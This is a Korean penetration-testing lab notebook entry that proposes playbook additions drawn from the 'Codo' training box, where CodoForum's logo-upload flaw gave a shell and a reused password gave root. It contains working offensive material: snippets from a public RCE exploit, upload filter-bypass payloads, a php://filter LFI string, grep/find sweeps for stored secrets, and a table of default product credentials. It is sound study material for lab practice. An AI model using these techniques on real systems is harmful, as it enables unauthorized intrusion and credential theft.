---
tags:
  - type/audit
  - platform/pg
type: audit
platform: pg
---

# Codo — `_PLAYBOOK` 이관 제안 (9건)

작성: `pg-note-forge` / 2026-08-26. **`_PLAYBOOK.md` 는 열지 않았음.** 번호 배정·중복 병합은 단독 기록자 몫.

| # | 절 | 병합/신규 | 요지 |
|---|---|---|---|
| 1 | `A-11` | 병합 | nmap OS 지문 `MikroTik 97%` — 닫힌 포트가 없으면 지문은 무의미 |
| 2 | `A-13` | 병합 | 제품 버전을 «읽지 못하고» 익스플로잇 목록의 일치로 추정한 경우 |
| 3 | `A-14` | 병합 | 공개 PoC 가 Burp 프록시·자격증명·CSRF 토큰을 하드코딩 |
| 4 | `A-3` 하위 | **신규** | `su` 는 PTY 를 요구하지 않는다 — `must be run from a terminal` 은 `sudo` 의 문구 |
| 5 | `A-41` | 병합 | `www-data` 셸이면 SUID 보다 웹루트 설정 파일이 먼저 |
| 6 | `B-1`(웹) | **신규** | 인증 후 파일 업로드 → RCE — 조건 3개·경로 찾기·우회 사다리 |
| 7 | `B-1`(웹) | **신규** | 로그인 폼을 만나면 기본 자격증명이 1순위 — 제품별 기본값 표 |
| 8 | `B-6`(자격증명) | **신규** | 평문 비밀번호 하나 = 「이 조직이 쓰는 비밀번호」 — 전면 재사용 시험 |
| 9 | `D` | 병합 | Fundamental 30분 시계 + Codo 실측 타임라인 |

⚠️ 6·7·8 은 번호를 비워 둠. 노트 본문에는 **기존 앵커만** 걸었음(`A-11`·`A-13`·`A-14`·`A-41`·`B-62`).

---

## 1. `A-11. 자동 도구가 뱉은 값이 의심스럽다` — 병합

### 넣을 본문

**nmap OS 지문에 `Warning: OSScan results may be unreliable` 이 붙으면 그 블록은 통째로 버릴 것.** 열린 포트만 있고 **닫힌 포트가 없으면** OS 지문이 성립하지 않음 — 그래도 nmap 은 퍼센트를 붙여 출력함.

[[Codo]] — 22·80 만 열린 호스트에서 `Running (JUST GUESSING): ... MikroTik RouterOS 7.X (97%)`. 97% 라는 숫자를 믿고 라우터 익스플로잇을 뒤지면 시간을 통째로 날림. 실제 근거는 서비스 배너의 패키지 리비전이었음 — `OpenSSH 8.2p1 Ubuntu 4ubuntu0.7` + `Apache httpd 2.4.41 ((Ubuntu))` 둘 다 Ubuntu 20.04 focal 기본 패키지라 **독립 근거 2개로 서로를 확증**함. 셸 획득 후 `Linux codo 5.4.0-150-generic #167-Ubuntu` 가 세 번째 근거.

### 지우기 전 원문 (Codo.md 옛 1장 표 · 6장 ⑤)

```text
| `Warning: OSScan results may be unreliable` / `Running (JUST GUESSING)` | 열린 포트만 있고 닫힌 포트가 없어 OS 지문이 무의미하다. **`MikroTik RouterOS 97%`를 믿고 라우터 익스플로잇을 찾으러 가면 시간을 통째로 날린다** |

### ⑤ `MikroTik RouterOS 97%`를 쫓아감

nmap이 `Warning: OSScan results may be unreliable`을 명시했는데도 97%라는 숫자에 끌려 라우터 익스플로잇을 뒤지는 경우가 있다.
**닫힌 포트가 없으면 OS 지문은 신뢰할 수 없다.** 배너(`OpenSSH 8.2p1 Ubuntu 4ubuntu0.7`)가 훨씬 강한 근거다.
```

---

## 2. `A-13. 익스플로잇을 던지기 전에 버전과 CVE 표기를 검증한다` — 병합

### 넣을 본문

⚠️ **「제품 버전을 확정했다」와 「익스플로잇 목록에서 하나만 경로가 맞았다」는 다름.** 후자는 근거 1개이고, 그 익스플로잇이 통했다는 사후 결과로 자기를 증명할 뿐임.

[[Codo]] — 타겟에서 CodoForum 버전 문자열을 **한 번도 읽지 못했음.** `searchsploit codo` 결과 8건 중 로고 업로드 → `sites/default/assets/img/attachments/` 경로와 일치하는 것이 `CodoForum v5.1 - Remote Code Execution (RCE)` 하나뿐이라 그것을 골랐고 실제로 통했음. **결과적으로 맞았지만 절차로는 근거 1개짜리** — 그 익스플로잇이 안 통했다면 다음 수가 없었음.
→ 웹루트 `sites/default/` 에 `readme.txt` 가 실재했음(셸 획득 후 `ls` 로 확인됨). 웹에서도 같은 파일이 노출됐을 가능성이 높고 그랬다면 스캔 직후 1분 안에 버전이 나왔음 — **시도한 기록 없음** `[가정]`.
→ 버전을 뽑는 독립 경로: `<meta generator>` · 정적 자원의 `?v=` 쿼리 · `readme.txt` · `CHANGELOG.txt` · `config.php.example` 존재 여부 · 인증 후 대시보드/about.

### 지우기 전 원문 (Codo.md 옛 1장 warning 콜아웃 · 6장 ④)

````text
> [!warning] **버전을 특정하지 못한 채로 진행했다** — 이 노트의 가장 큰 공백
> 원문에는 CodoForum의 버전 번호를 확인한 기록이 없다. 결과적으로 기본 자격증명이 통해서 문제가 안 됐지만, 그게 안 통했다면 버전 없이는 다음 수가 없다.
> 버전을 뽑는 독립 경로 (표준 문서의 "버전 판정은 독립 근거 2개" 원칙):
> ```bash
> curl -s http://192.168.243.23/ | grep -iE 'generator|codoforum|version|/assets/.*\?v='
> curl -s http://192.168.243.23/readme.txt              # 배포본에 동봉되는 경우
> curl -s http://192.168.243.23/CHANGELOG.txt
> curl -s -I http://192.168.243.23/sites/default/config.php.example
> ```
> 셸을 잡은 뒤의 `ls` 출력에 `readme.txt`가 실제로 보인다(4장 참조). 웹에서도 같은 파일이 노출됐을 가능성이 높고, 그랬다면 스캔 직후 1분 안에 버전이 나왔다.
> 같은 함정: [[Hub]] · [[Levram]] · [[RubyDome]] · [[Astronaut]] — 버전은 근거 2개로 못 박고 시작한다.

### ④ 버전 특정을 건너뛴 채 진행

1장에서 지적한 대로 CodoForum 버전을 확정하지 않았다. 기본 자격증명이 통해서 결과적으로 문제가 없었을 뿐이다.
만약 `admin:admin`이 막혔다면 버전 없이는 `searchsploit`을 돌릴 수도 없어 완전히 멈췄을 것이다. `readme.txt`가 웹루트에 있었으므로 1분이면 해결됐다.
````

⚠️ **원본의 「버전을 특정하지 못했다」는 서술은 절반만 맞았음.** 실제로는 EDB 50978 의 헤더(`Version: CodoForum v5.1`)를 통해 **v5.1 을 전제로 진행**했고, 노트에는 그 사실이 아예 빠져 있었음. 새 노트는 「간접 근거 1개로 추정했다」로 정정했음.

---

## 3. `A-14. 공개 PoC는 실행 전에 소스를 읽는다` — 병합

### 넣을 본문

**소스에서 볼 것에 «네트워크 경로»와 «인자가 실제로 쓰이는가»를 추가할 것.** 제품·버전·실행가능성(A-14 기존 3개) 다음 순서임.

[[Codo]] — exploit-db 50978(`CodoForum v5.1 RCE`, CVE-2022-31854)에 셋이 동시에 박혀 있었음:

```python
proxy = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
...
auth = session.post(loginURL, headers=send_headers, cookies=send_cookies, data=send_creds, proxies=proxy)
exploit = requests.post(globalSettings, headers=send_headers, cookies=send_cookies, data=send_payload, proxies=proxy)
payloadExec = session.get(payloadURL + randomFileName + '.php', proxies=proxy)
```
— 출처: `~/PG/Codo/50978.py`

- **Burp 프록시(`127.0.0.1:8080`) 하드코딩** — 로그인·업로드·실행 세 요청 전부에 붙음. Burp 를 안 띄운 상태로 그냥 돌리면 죽음. 반면 `getPHPSESSID()` 의 첫 GET 만 `proxies` 가 없어서 **초반은 정상으로 보임** — 실패 지점이 뒤로 밀려 원인 파악이 어려워짐
- **`-u`/`-p` 인자가 무시됨** — `login()` 의 multipart 본문에 `admin`/`admin` 이 **문자열로 박혀** 있음. 다른 자격증명을 넣어도 그 값이 안 감
- **`CSRF_token` 이 고정값**(`23cc3019cadb6891ebd896ae9bde3d95`) — 타겟이 토큰을 검증하면 그대로 실패함

[[Codo]] 는 이 PoC 를 **실행기가 아니라 지도로** 썼음 — PoC 가 알려준 세 경로(`/admin/?page=login` · `/admin/index.php?page=config` · `/sites/default/assets/img/attachments/`)와 취약 필드(`forum_logo`)만 취해 브라우저로 수동 업로드함 `[가정]`. 근거: ① PoC 는 파일명을 소문자 10자 난수로 만드는데 실제 파일명은 `payload.php` 고정 ② PoC 페이로드는 `mkfifo`+`nc` 인데 회수된 셸 배너는 `uname -a` → `w` → `id` 로 pentestmonkey `php-reverse-shell.php` 의 것.
→ 일반화: **PoC 가 안 도는 것이 「그 취약점이 없다」는 뜻이 아님.** 소스에서 «어느 엔드포인트 / 어느 파라미터 / 어느 저장 경로»만 뽑아 수동 재현하면 됨.

### 지우기 전 원문

원 노트에는 이 PoC 에 대한 서술이 **전혀 없었음**(50978.py 사용 사실 자체가 노트에서 누락). 산출물(`~/PG/Codo/50978.py`)과 `~/.zsh_history` 2300~2306행에서 복원한 것임. 삭제한 원문 없음.

관련해서 삭제한 서술은 아래 `[가정]` 하나임 — 새 노트에 근거를 보강해 유지함:

```text
[가정] 업로드한 `payload.php`는 pentestmonkey `php-reverse-shell.php`(또는 그 파생본)이며, `$shell`의 `/bin/sh`가 `/bin/bash`로 바뀐 판본이다 — 이어지는 `bash:` 에러와 `www-data@codo:/$` 프롬프트가 bash이기 때문이다.
```

---

## 4. `A-3. 셸` 하위 — **신규**

### 제목(안)

`su` 는 PTY 를 요구하지 않는다 — `must be run from a terminal` 은 `sudo` 의 문구다

### 넣을 본문

**「PTY 가 없으면 `su` 가 거부된다」는 널리 퍼진 오해임.** 그 문구를 내는 것은 `sudo` 지 `su` 가 아님.

util-linux `su` 는 TTY 가 없으면 `Password:` 를 내고 **stdin 에서 그대로 읽음:**

```bash
ssh kali@10.44.44.128 "echo 'wrongpass' | su root -c id"
```
```text
Password: su: Authentication failure
```

`su` 바이너리에는 그 문자열이 아예 없음 — `strings $(which su) | grep -i terminal` 이 돌려주는 것은 `--pty` 옵션 설명뿐임:

```text
 -P, --pty                       create a new pseudo-terminal
 -T, --no-pty                    do not create a new pseudo-terminal (bad security!)
```

같은 검사를 `sudo` 에 하면 그 문구가 나옴:

```text
a terminal is required to read the password; either use ssh's -t option or configure an askpass helper
```
— 확인: Kali, util-linux 2.41.2 (2026-08-26 실행)

`sudo` 는 TTY 를 요구하고 위 문구로 거부함(`-S` 로 stdin 읽기, `-A` 로 askpass 우회 가능).

**실측** — [[Codo]] 는 `bash: cannot set terminal process group` / `bash: no job control in this shell` 이 찍힌 **PTY 없는 리버스셸**에서 `su root` 가 그대로 성립해 root 를 잡았음. PTY 업그레이드 기록 없음.

```text
www-data@codo:/var/www/html/sites/default$ su root
su root
Password: FatPanda123
whoami
root
```

⚠️ 그렇다고 PTY 를 안 올려도 된다는 뜻은 아님 — `Ctrl+C` 로 셸 전체가 죽고, `vi`·`top` 이 깨지고, 탭 완성·히스토리가 없음. **다만 `su` 가 실패했을 때 원인을 「PTY 없음」으로 단정하지 말 것** — 비밀번호가 틀렸거나 대상 계정이 잠긴 것일 수 있음.

PTY 업그레이드는 그대로 반사로 둘 것:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
script -qc /bin/bash /dev/null
perl -e 'exec "/bin/bash";'
# Ctrl+Z 로 빠져나온 뒤
stty raw -echo; fg
export TERM=xterm; stty rows 50 columns 200
```
(`python3` 이 없어 `script` 로 넘어간 사례: [[Hawat]])

⚠️ **`nc` 리스너 전사에서 명령이 두 번 찍히는 것은 에코원이 «둘» 이기 때문임** — ① 리스너 쪽 로컬 터미널(`rlwrap nc`)의 타이핑 에코 ② **PTY 없는 `bash -i` 자신의 에코**. ②는 Kali 에서 재현됨(2026-08-26 실행):

```bash
ssh kali@10.44.44.128 "printf 'whoami\nexit\n' | bash -i"
```
```text
bash: cannot set terminal process group (927881): Inappropriate ioctl for device
bash: no job control in this shell
kali@kali:~$ whoami
kali
```
로컬 에코가 전혀 없는 파이프인데도 프롬프트 뒤에 `whoami` 가 한 번 더 찍힘 — **원격 bash 가 되찍은 것**임.

`Password:` 뒤에 비밀번호가 평문으로 보이는 것은 ①뿐임 — 그 줄은 `su` 가 stdin 에서 직접 소비하므로 ②가 안 걸림. 「비밀번호가 에코됐으니 TTY 가 없다」로 읽지 말 것.

⚠️ 이전 판은 이 현상을 통째로 「`rlwrap` 로컬 에코」로 적었으나 **위 재현으로 반증됨** — ②가 빠져 있었음.

### 지우기 전 원문 (Codo.md 옛 0장 · 3-3 · 4-6 · 6장 ② · 7장 8번)

````text
- `su`로 비밀번호를 시험하는 것과 SSH로 시험하는 것의 차이 — TTY 요구, 로그, `PermitRootLogin` 제약

> [!warning] `bash: cannot set terminal process group` / `no job control` — 에러가 아니다
> PTY(의사 터미널)가 없는 셸이라는 뜻일 뿐이고, 명령은 정상 실행된다. 실제로 바로 아래 `whoami`가 동작한다.
> 다만 PTY가 없으면 못 하는 것들이 있다:
> - `Ctrl+C`를 누르면 셸 전체가 죽는다 (리스너까지 끊긴다)
> - `su` · `ssh` · `passwd` · `sudo`(설정에 따라) 가 **"must be run from a terminal"로 거부**된다 ← 4장에서 결정적
> - `vi`·`nano`·`top` 같은 화면 기반 프로그램이 깨진다
> - 탭 완성·히스토리 없음
>
> 셸을 잡으면 반사적으로 PTY부터 올린다:
> ```bash
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> # python3이 없으면
> script -qc /bin/bash /dev/null
> perl -e 'exec "/bin/bash";'
> # 그 다음 완전 업그레이드 (Ctrl+Z로 빠져나와서)
> stty raw -echo; fg
> export TERM=xterm; stty rows 50 columns 200
> ```
> `python3`이 없어 `script`로 넘어간 사례: [[Hawat]]

### 4-6. `su`로 시험하는 것과 SSH로 시험하는 것의 차이

| 항목 | `su <user>` (로컬) | `ssh <user>@target` (원격) |
|---|---|---|
| TTY 요구 | 필수. PTY 없는 리버스셸에서는 `su: must be run from a terminal` 로 거부된다 | 칼리에서 실행하므로 TTY 문제 없음 |
| 얻는 셸의 품질 | 상위 셸의 품질을 물려받는다 — PTY 없으면 여전히 불편 | 완전한 TTY. 탭 완성·Ctrl+C·`vi` 전부 정상 |
| 서버 설정에 막히는가 | 거의 안 막힌다. `su`는 로컬 인증 | `PermitRootLogin no`면 root SSH가 막힌다(Ubuntu 기본값이 `prohibit-password`) |
| | | `AllowUsers`/`DenyUsers`, `PasswordAuthentication no` 에도 막힌다 |
| 네트워크 필요 | 불필요 — 이미 안에 있다 | 22가 외부에서 열려 있어야 한다 |
| 남는 로그 | `/var/log/auth.log`의 `su` 항목 | `auth.log` + `wtmp`/`lastlog`. `w`·`last`에 세션이 보인다 |
| 안정성 | 리버스셸이 끊기면 같이 죽는다 | 독립 세션. 리버스셸이 죽어도 유지된다 |
| 속도 | 즉시 | 즉시 |

> [!danger] **`su`가 `must be run from a terminal`을 뱉는다고 비밀번호가 틀린 게 아니다**
> 이 오독이 자격증명 재사용 박스에서 가장 자주 시간을 태우는 지점이다. `su`는 비밀번호를 터미널에서만 읽으려 하기 때문에 PTY가 없으면 인증을 시도조차 안 한다.
> 순서를 고정하라: PTY 업그레이드 → `su`.
> ```bash
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> su root
> ```
> 원문 기록에서는 `su root` 가 곧바로 성립했다. [가정] 중간에 PTY 업그레이드를 했으나 노트에 옮겨 적지 않았거나, 이 판본의 웹셸이 PTY를 함께 제공했을 가능성이 높다. 어느 쪽이든 시험장에서는 PTY를 먼저 올리는 절차로 고정하는 것이 안전하다.

### ② `su`가 `must be run from a terminal` — 비밀번호가 틀린 걸로 오독

4-6절에서 다뤘다. PTY를 먼저 올린다. 이걸 모르면 정답 비밀번호를 손에 쥐고도 "안 통한다"고 결론 내린다.

### ③ SSH로 root 로그인을 시도하다 막힘

`ssh root@192.168.243.23`으로 `FatPanda123`을 넣으면 **Ubuntu 기본 `PermitRootLogin prohibit-password` 때문에 거부**될 수 있다. 그러면 "비밀번호가 틀렸다"고 오판한다.
**로컬에 셸이 있으면 `su`가 SSH보다 우선이다.** SSH는 셸이 없을 때나, 안정적인 TTY가 필요할 때 쓴다.

8. **`su`는 PTY를 요구한다.** `must be run from a terminal`은 **비밀번호 오류가 아니다.** `python3 -c 'import pty; pty.spawn("/bin/bash")'` → `script -qc /bin/bash /dev/null` 순으로 올린 뒤 `su`.
9. **로컬 셸이 있으면 `su`가 SSH보다 우선이다.** SSH는 `PermitRootLogin`·`PasswordAuthentication`·`AllowUsers`에 막힐 수 있고, 그 거부를 "비밀번호 틀림"으로 오독하기 쉽다. 반대로 **안정된 TTY가 필요하면 SSH가 낫다.**
````

⚠️ **위 원문의 「TTY 요구: 필수」·「인증을 시도조차 안 한다」는 반증됨.** 표 나머지 항목(로그·안정성·`PermitRootLogin`·네트워크)은 여전히 유효하므로 새 항목의 부록으로 함께 넣을지는 기록자 판단. 「로컬 셸이 있으면 `su` 가 SSH 보다 우선」은 유지 가치가 있음.

---

## 5. `A-41. 셸은 잡았는데 권한상승 실마리가 없다` — 병합

### 넣을 본문

**`www-data`·`apache`·`nginx` 같은 웹 서비스 계정으로 떨어졌으면 SUID·크론보다 «웹루트 설정 파일»이 먼저임.** 서비스 계정은 SUID·크론이 걸릴 일이 거의 없고, 대신 애플리케이션 설정 파일 전량을 읽을 수 있음. [[Codo]] 는 `id` 가 `uid=33(www-data) gid=33(www-data) groups=33(www-data)` 로 특수 그룹이 하나도 없었고, `harvest` 5종이 전부 빈손인 대신 `sites/default/config.php` 한 줄로 끝났음.

**설정 파일 이름은 스택마다 정해져 있음 — 암기 대상임.** `find` 없이 바로 `cat` 할 것:

| 스택 | 설정 파일 | 흔한 위치 |
|---|---|---|
| CodoForum | `config.php` | `<웹루트>/sites/default/config.php` ([[Codo]]) |
| WordPress | `wp-config.php` | `<웹루트>/wp-config.php` |
| Drupal | `settings.php` | `<웹루트>/sites/default/settings.php` |
| Joomla | `configuration.php` | `<웹루트>/configuration.php` |
| Magento | `env.php` | `app/etc/env.php` |
| Laravel / Symfony / 범용 | `.env` | 프로젝트 루트 (숨김 파일이라 `ls -la`) |
| Django | `settings.py` · `local_settings.py` | `<프로젝트>/<앱>/settings.py` |
| Rails | `config/database.yml` · `config/secrets.yml` | 프로젝트 루트 |
| Spring Boot | `application.properties` · `application.yml` | `src/main/resources/`, jar 내부 |
| Node.js | `config.json` · `.env` · `ecosystem.config.js` | 프로젝트 루트 |
| ASP.NET | `web.config` · `appsettings.json` | 앱 루트 |
| Tomcat | `tomcat-users.xml` | `/etc/tomcat*/` · `$CATALINA_HOME/conf/` |
| phpMyAdmin | `config.inc.php` | `/etc/phpmyadmin/` · `<웹루트>/phpmyadmin/` |

표에 없는 제품이면 전수 검색 — **이름보다 내용으로 찾는 쪽이 회수율이 높음:**

```bash
grep -rn "password" /var/www --include="*.php" 2>/dev/null
grep -rniE "pass(word|wd)?\s*[=:>]|DB_PASS|secret|api[_-]?key" /var/www 2>/dev/null | head -50
find / -name "config*.php" 2>/dev/null
find / \( -name ".env" -o -name "*.yml" -o -name "*.ini" -o -name "settings.py" \
       -o -name "web.config" -o -name "application*.properties" \) 2>/dev/null | grep -v -E '^/(proc|sys|usr/share)'
ls -la /var/www/html /home/* /opt/* 2>/dev/null
cat /home/*/.bash_history /root/.bash_history 2>/dev/null
find / \( -name "*.bak" -o -name "*.old" -o -name "*~" -o -name "*.save" -o -name "*.orig" \) 2>/dev/null
```

- `2>/dev/null` — 필수. 빼면 `Permission denied` 가 수천 줄 쏟아져 진짜 결과가 묻힘. 서비스 계정은 대부분의 디렉터리에 접근 못 함
- `--include="*.php"` — 빼면 바이너리·이미지까지 뒤져 몇 분씩 걸리고 이진 매칭 잡음이 섞임
- `grep -v -E '^/(proc|sys...'` — 가상 파일시스템 제외. 빼면 `/proc` 순회로 결과가 오염됨

⚠️ **`config.php.example` 이 옆에 있으면 `diff` 를 칠 것** — 관리자가 «무엇을 바꿨는지»만 뽑아내는 지름길임([[Codo]] 의 `sites/default/` 에 실재).

⚠️ **`.php` 설정 파일은 웹으로 직접 열어도 소스가 안 보임** — 서버가 실행해버리기 때문임. `defined('IN_CODOF') or die();` 같은 가드가 있으면 200 에 빈 본문이 옴. 「파일이 없다」가 아니라 「파싱하고 즉시 종료했다」임([[Crane]] 에서 실측). LFI 가 있으면 `?page=php://filter/convert.base64-encode/resource=sites/default/config.php`.

### 지우기 전 원문 (Codo.md 옛 4-1 · 4-2 · 4-3 · 7장 5·6번)

원문 전량은 `03. PG\_backup\Codo.md.bak` 405~493행. 요지 인용:

```text
**www-data로 떨어졌으면 6번째 명령이 있다 — 웹루트 뒤지기.** 웹 서비스 계정으로 셸을 잡았다는 것은 웹 애플리케이션의 파일을 전부 읽을 수 있다는 뜻이다.
`www-data`는 SUID·크론이 걸릴 일이 거의 없는 계정이라, 다섯 개보다 설정 파일이 먼저 나오는 경우가 훨씬 많다. 이 박스가 정확히 그 경우다.

5. **www-data 셸을 잡으면 웹루트 설정 파일이 SUID보다 먼저다.** 서비스 계정은 SUID·크론이 걸릴 일이 거의 없다. `find / -perm -4000`을 돌리기 전에 `cat <웹루트>/config.php`를 쳐라.
6. **설정 파일 이름은 스택마다 정해져 있다** — `config.php` · `wp-config.php` · `settings.php` · `configuration.php` · `.env` · `application.properties` · `settings.py` · `database.yml` · `web.config` · `tomcat-users.xml`. **암기 대상이다.**
```

(4-3 의 스택별 표 13행과 전수 검색 코드블록 4개, 플래그 해설 표 6행이 통째로 이관 대상 — 위 「넣을 본문」이 그 전량임.)

---

## 6. `B-1. 웹` 하위 — **신규**

### 제목(안)

인증 후 파일 업로드 → RCE — 조건 셋과 업로드 경로 찾기

### 넣을 본문

**관리자 세션을 얻으면 관리자 기능 «자체»가 익스플로잇임.** 포럼·CMS 관리 패널에는 거의 항상 다음 중 하나가 있음:

| 기능 | RCE 로 가는 경로 |
|---|---|
| 첨부·미디어 업로드 | 확장자 필터를 뚫고 `.php` 업로드 |
| **로고·아이콘·아바타 업로드** | 첨부와 «다른 코드 경로»라 화이트리스트가 안 걸리는 경우가 있음 ([[Codo]]) |
| 테마·템플릿 편집기 | 템플릿에 PHP 코드 삽입 후 페이지 렌더 |
| 플러그인 업로드 | `.zip` 안에 웹셸 |
| 백업·복원 | 임의 경로에 파일 쓰기 |
| 로그 뷰어 + LFI | 로그에 PHP 주입 후 포함 |

⚠️ **「첨부 확장자 화이트리스트가 있으니 업로드는 막혔다」로 접지 말 것.** [[Codo]] 의 Global Settings 화면은 첨부 확장자 화이트리스트(`jpg,jpeg,png,gif,pjpeg,bmp,txt`)를 다루면서도 **같은 화면의 「포럼 로고」 필드는 `.php` 를 그대로 받아** `sites/default/assets/img/attachments/` 에 저장했음(CVE-2022-31854). 실측으로 확인된 것은 「`.php` 가 저장되고 실행됐다」까지고 화이트리스트가 로고 경로에 왜 미적용인지는 소스 미확인 `[가정]`.
→ **업로드 필드를 «기능별로» 세어볼 것.** 첨부 · 로고 · 파비콘 · 아바타 · 배경 · 임포트/복원 — 각각 다른 핸들러일 수 있음.

**왜 업로드가 곧 RCE 인가 — 조건 셋이 동시에 성립해야 함:**
1. `.php` 확장자가 저장됨 — 필터가 없거나, 우회 가능하거나, 서버가 이중 확장자를 PHP 로 넘김
2. 저장 위치가 웹루트 아래임 — URL 로 도달 가능해야 함
3. 그 디렉터리에서 PHP 실행이 안 막혀 있음 — `.htaccess` 의 `php_admin_flag engine off` 나 `<FilesMatch>` 차단이 없어야 함

**응답 코드로 어디가 막혔는지 즉시 가름:**
- **404** — 그 URL 에 파일이 없음 → 경로·파일명 문제(2번)
- **200 인데 소스가 그대로 보임** — PHP 로 실행이 안 됨 → 실행 차단·확장자 문제(3번 또는 1번)
- **403** — 디렉터리 접근 차단

**업로드가 막혔을 때의 우회 사다리 — 위에서부터:**
1. 그냥 `.php` — 놀랍도록 자주 통함. 먼저 시도할 것
2. 대체 확장자 — `.php3` `.php4` `.php5` `.php7` `.phtml` `.phar` `.inc` (⚠️ Debian 계열 현행 `.conf` 정규식에서는 `.php3~7` 이 **실행되지 않음.** 서버 설정이 넓게 잡혀 있을 때만 통함 — 통한다고 단정하지 말 것)
3. 대소문자 — `.PHP` `.pHp` (블랙리스트가 소문자만 볼 때)
4. 이중 확장자 — `shell.php.jpg` / `shell.jpg.php`
5. 널바이트 — `shell.php%00.jpg` (PHP 5.3 미만)
6. Content-Type 위조 — `image/jpeg` 로 바꿔 MIME 검사만 통과
7. 매직바이트 + PHP — 앞에 `GIF89a;` 를 붙이고 뒤에 `<?php ... ?>` (`getimagesize()` 우회)
8. `.htaccess` 업로드 — `AddType application/x-httpd-php .jpg`

**업로드 경로 찾기 — 여기서 가장 자주 막힘.** 올리는 데 성공해도 URL 을 모르면 실행 못 함.

① 응답이 알려주는 경우 (가장 흔함 — 여기부터)
```bash
curl -s http://<타겟>/<업로드된_글> | grep -oE '(src|href)="[^"]*attachments[^"]*"'
```
업로드 성공 화면의 미리보기 URL · 글에 삽입된 첨부 링크의 `href` · 관리자 패널의 파일 매니저 목록 · JSON 응답의 `url` 필드 · HTTP `Location:` 헤더.

② 응답이 안 알려주는 경우 — **공개 PoC 에 경로가 하드코딩돼 있음**(A-14). [[Codo]] 는 EDB 50978 의 `payloadURL = options.target + '/sites/default/assets/img/attachments/'` 한 줄이 답이었음.
```bash
searchsploit -m <exploit-id>
git clone <제품 저장소> && grep -rn "upload_dir\|move_uploaded_file\|attachments" .
for d in uploads upload files media attachments images img \
         sites/default/assets/img/attachments assets/uploads wp-content/uploads; do
  printf '%-45s %s\n' "$d" "$(curl -s -o /dev/null -w '%{http_code}' http://<타겟>/$d/)"
done
curl -s http://<타겟>/sites/default/assets/img/attachments/   # 디렉터리 인덱싱
```

| 제품군 | 업로드 관례 경로 |
|---|---|
| CodoForum | `sites/default/assets/img/attachments/` |
| WordPress | `wp-content/uploads/YYYY/MM/` |
| Joomla | `images/` · `tmp/` |
| Drupal | `sites/default/files/` |
| phpBB | `files/` · `images/avatars/upload/` |
| Laravel | `storage/app/public/` · `public/uploads/` |
| Tomcat | `webapps/<앱>/` (WAR 배포) |

⚠️ **파일명이 서버에서 바뀌면 `payload.php` 로 두드려도 404 임.** 해시·타임스탬프·랜덤으로 재생성하는 CMS 가 많음. **404 를 「업로드 실패」로 오독하면 여기서 30분을 잃음.** 대응 — ①로 되돌아가 응답 본문·DOM 에서 실제 파일명 찾기 · 디렉터리 인덱싱 · 관리자 패널의 첨부 관리 화면 · 그래도 안 되면 경로를 통제할 수 있는 기능(테마 편집기·백업 복원)으로 갈아탈 것.
[[Codo]] 는 파일명이 유지된 쉬운 케이스였음(수동 업로드라 `payload.php` 그대로). 시험에서는 그렇지 않을 것으로 가정할 것.

**같은 계열** — [[Exfiltrated]](`.phar`) · [[Squid]](파일 쓰기 경로 자체를 바꾸는 계열) · [[Crane]] · [[Levram]].

### 지우기 전 원문

Codo.md 옛 2-4 · 2-5 · 6장 ① 전량. `03. PG\_backup\Codo.md.bak` 220~315행 · 669~675행.
⚠️ **원문 2-4 의 `.php3~7` 항목은 「Apache 의 `AddType` 설정이 넓게 잡혀 있으면 전부 실행된다」로 단정했음** — `_WRITEUP-STANDARD` 가 이미 「현행 Debian 정규식에서는 성립하지 않음」으로 잡아둔 오류라 위 「넣을 본문」에서 유보를 붙였음.

---

## 7. `B-1. 웹` 하위 — **신규**

### 제목(안)

로그인 폼을 만나면 기본 자격증명이 1순위 — 제품별 기본값 표

### 넣을 본문

**브루트포스보다 기대값이 압도적으로 높음.**

| | 기본 자격증명 | 브루트포스 |
|---|---|---|
| 요청 수 | 5~10회 | 수천~수십만 회 |
| 소요 시간 | 1분 | 수십 분~시간 |
| 계정 잠금 위험 | 거의 없음 | 높음. 잠기면 그 박스는 끝 |
| 탐지 | 로그 몇 줄 | IDS/WAF 확정 탐지 |
| 시험 규정 | 제한 없음 | 제한적 허용이나 사실상 시간만 태움 |

**순서는 고정임:**
1. 제품별 문서상 기본값 (제품을 식별했으면 1순위)
2. `admin:admin` · `admin:password` · `admin:123456` · `administrator:administrator`
3. 정찰에서 주운 것 — 페이지 하단 이메일, 팀 소개, `robots.txt`, 커밋 로그의 이름
4. 그래도 없으면 그때 짧은 사전으로 스프레이

**후보가 유한하므로 배치로 쏘고 응답을 diff 할 것**(D 절). 판정은 상태코드가 아니라 **본문 크기 diff** 로도 충분함.

| 제품 | 기본 자격증명 | 관리 경로 |
|---|---|---|
| CodoForum | 설치 시 관리자 지정 — `admin:admin` 은 「게으른 설치」의 산물([[Codo]]) | `/admin/index.php` |
| Tomcat Manager | `tomcat:tomcat` · `admin:admin` · `tomcat:s3cret` | `/manager/html` |
| Jenkins | 초기 비인증 또는 `admin:admin` | `/` · `/script` |
| phpMyAdmin | `root:`(빈 비밀번호) | `/phpmyadmin` |
| Grafana | `admin:admin` | `/login` |
| Zabbix | `Admin:zabbix` | `/zabbix` |
| JBoss/WildFly | `admin:admin` | `/console` |
| Webmin | 설치 시 root 계정 | `:10000` |
| PRTG | `prtgadmin:prtgadmin` | `/index.htm` |
| GitLab | `root:5iveL!fe`(구버전) | `/users/sign_in` |

⚠️ **표의 값은 「해봐야 아는 후보」지 확정된 현행 기본값이 아님.** 제품·버전에 따라 다름 — 표에 없는 제품은 `searchsploit <제품명> | grep -i default` 와 「제품명 + default password」 검색이 익스플로잇 검색보다 회수율이 높음.

**기본 자격증명은 「취약점이 아니다」가 아님** — OWASP A05/A07, CWE-1392(Use of Default Credentials). CVE 번호가 없다고 등급이 낮은 것이 아니라 실제 침해 사고의 최상위 원인임.

⚠️ **HTTP 200 이 실패를 뜻할 수 있음.** 로그인 실패 시 폼을 다시 렌더하면 200 이고 성공 시 대시보드로 보내면 302 임 — 이 계열 앱에서는 **302 가 성공**임. 판정은 셋을 함께 볼 것: ①상태 코드 ②`Location:` 헤더 ③`Set-Cookie` 로 세션이 새로 발급됐는가. (기존 `A-12. 응답이 성공을 뜻하지 않는다` 와 상호 링크)

**이 뒤에 오는 것이 「특정 버전의 인증 후 RCE」임**(A-13). [[Codo]] · [[Crane]] · [[Levram]] · [[Exfiltrated]] · [[Hawat]] · [[CVE-2023-46818]] 이 전부 같은 형태.

### 지우기 전 원문

